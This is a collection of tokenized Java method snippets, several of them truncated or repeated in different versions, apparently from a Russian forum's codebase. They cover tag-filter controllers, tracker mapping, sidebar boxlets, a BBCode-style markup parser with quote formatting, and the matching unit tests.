public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException , UserNotFoundException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { try { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } } return ignoreMap ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { String r = favoriteTagAdd ( request , tagName ) ; if ( r ! = null ) { ModelAndView modelAndView = showList ( request , tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , tagName + " : " + r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , String > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { String r = favoriteTagAdd ( request , tagName ) ; if ( r ! = null ) { return ImmutableMap . of ( " error " , r ) ; } return ImmutableMap . of ( ) ; } 
public @ResponseBody Map < String , String > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String title = resultSet . getString ( " title " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; ImmutableList < String > tags ; if ( msgid ! = 0 ) { tags = topicTagService . getMessageTagsForTitle ( msgid ) ; } else { tags = ImmutableList . of ( ) ; } return new TrackerItem ( author , msgid , lastmod , stat1 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public String tracker ( ) { return " redirect:tracker " ; } 
public View trackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction ) throws UnsupportedEncodingException { RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; if ( filterValues . contains ( filterAction ) & & ! filterAction . equals ( " all " ) ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , true ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { List < String > r = favoriteTagAdd ( request , tagName ) ; if ( r . size ( ) ! = 0 ) { ModelAndView modelAndView = showList ( request , tagName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , String > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { List < String > r = favoriteTagAdd ( request , tagName ) ; if ( r . size ( ) ! = 0 ) { return ImmutableMap . of ( " error " , StringUtils . join ( r , " ; " ) ) ; } return ImmutableMap . of ( ) ; } 
private List < String > favoriteTagAdd ( HttpServletRequest request , @RequestParam String tagName ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; return userTagService . addMultiplyTags ( user , tagName , true ) ; } 
Map < String , String > favoriteTagDelJSON ( ServletRequest request , @RequestParam String tagName ) throws TagNotFoundException , AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , tagName ) ; return ImmutableMap . of ( ) ; } 
public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , true ) ; try { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( strErrors . size ( ) , 3 ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , false ) ; try { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( strErrors . size ( ) , 3 ) ; } 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) & & ! newGrp . isImagePostAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
private PreparedImage prepareImage ( Topic topic , boolean secure ) { String mediumName = Screenshot . getMediumName ( topic . getUrl ( ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = topic . getLinktext ( ) ; } try { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
private void initializeBoxlet ( ) throws SectionNotFoundException { sectionNews = sectionService . getSection ( Section . SECTION_NEWS ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { List < ArchiveDTO > list = archiveDao . getArchiveDTO ( sectionNews , 13 ) ; return new ModelAndView ( " boxlets/archive " , " items " , list ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < GalleryItem > list = galleryDao . getGalleryItems ( COUNT_ITEMS ) ; mav . addObject ( " items " , list ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { ProfileProperties profile = Template . getTemplate ( request ) . getProf ( ) ; final int i = profile . getTags ( ) ; List < TagDTO > list = tagDao . getTags ( i ) ; ModelAndView mav = new ModelAndView ( " boxlets/tagcloud " , " tags " , list ) ; mav . addObject ( " count " , i ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) throws Exception { final Poll poll = pollDao . getCurrentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopicId ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Throwable ex = ( Throwable ) request . getAttribute ( " javax.servlet.error.exception " ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } if ( ! ( ex instanceof Exception ) ) { return exceptionResolver . resolveException ( request , response , handler , new RuntimeException ( ex ) ) ; 
public String parseForOgDescription ( String text ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , true ) , text ) . renderOg ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; } 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( " " ) ; if ( stringBuilder . length ( ) > = 250 ) { break ; } } if ( stringBuilder . length ( ) < = 250 ) { return stringBuilder . toString ( ) . trim ( ) ; 
public String renderOg ( ) { return renderChildrenOg ( ) ; } 
public String renderOg ( ) { return bbtag . renderNodeOg ( this ) ; } 
public String renderOg ( ) { return Parser . escape ( text ) ; } 
public String renderNodeOg ( Node node ) { return " " ; } 
public String renderNodeOg ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( node . renderChildrenOg ( ) ) ; return ret . toString ( ) ; } 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + " " + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , 
public Poll getPoll ( final int pollId ) throws PollNotFoundException { int currentPollId = getCurrentPollId ( ) ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { throw new PollNotFoundException ( ) ; } return new Poll ( pollId , 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( " " ) ; } return stringBuilder . toString ( ) . trim ( ) ; } 
public String renderOg ( ) { String ret = renderChildrenOg ( ) ; if ( ret . length ( ) < 250 ) { return ret ; 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + " " + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( txt ) ) ; assertEquals ( 250 + 3 , 
public boolean resetPhoto ( User user ) { return jdbcTemplate . update ( " UPDATE users SET photo=null WHERE id=? and photo is not null " , user . getId ( ) ) > 0 ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex ) { return new ModelAndView ( " errors/user-banned " , " exception " , ex ) ; } 
public ModelAndView handleUserNotFoundException ( ) { return new ModelAndView ( " errors/code404 " ) ; } 
public String format ( String text , boolean quoting ) { if ( quoting ) { return quote ( text ) ; 
private String escapeCode ( String text ) { return text . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = true ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , toLorCodeTexFormatter . format ( " [code][/code] " , true ) ) ; assertEquals ( " [code=perl][/code] " , toLorCodeTexFormatter . format ( " [code=perl][/code] " , true ) ) ; assertEquals ( " [[code]][[/code]] " , toLorCodeFormatter . format ( " [code][/code] " , true ) ) ; assertEquals ( " [[code=perl]][[/code]] " , toLorCodeFormatter . format ( " [code=perl][/code] " , true ) ) ; 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " , true ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " , true ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , toLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " , true ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , toLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " , true ) ) ; assertEquals ( " [code]test[/code] " + 
public String format ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = true ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , toLorCodeTexFormatter . format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", toLorCodeTexFormatter.format("test>test")); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &")); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , toLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , toLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; assertEquals ( " [[code]][[/code]] " , toLorCodeFormatter . format ( " [code][/code] " , true ) ) ; assertEquals ( " [[code=perl]][[/code]] " , toLorCodeFormatter . format ( " [code=perl][/code] " , true ) ) ; 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , toLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , toLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , toLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeFormatter . format ( " >one n>>two n>one n>>>three " , true ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , toLorCodeTexFormatter . format ( " >one n>>two n>one n>>>three " ) ) ; 
public String format ( String text , boolean quoting ) { String newText = ToLorCodeTexFormatter . escapeCode ( text ) ; if ( quoting ) { return quote ( newText ) ; 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( " [br] " ) ; } continue ; } Matcher m = ToLorCodeTexFormatter . QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public static String escapeCode ( String text ) { return text . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; } 
public static String escapeCode ( String text ) { return text . replaceAll ( " ([^ \\ []|^) \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " $1[[$2]] " ) ; } 
public void codeEscapeBasic ( ) { assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [/code] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [[code]] " ) ) ; assertEquals ( " [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [[/code]] " ) ) ; assertEquals ( " ][[code]] " , ToLorCodeTexFormatter . escapeCode ( " ][code] " ) ) ; assertEquals ( " [[code]] [[code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , ToLorCodeTexFormatter . escapeCode ( " [code] [/code] " ) ) ; 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , toLorCodeTexFormatter . format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , toLorCodeTexFormatter . format ( " [code=perl][/code] " ) ) ; assertEquals ( " [[code]] [[/code]] " , toLorCodeFormatter . format ( " [code] [/code] " , true ) ) ; assertEquals ( " [[code=perl]] [[/code]] " , toLorCodeFormatter . format ( " [code=perl] [/code] " , true ) ) ; 
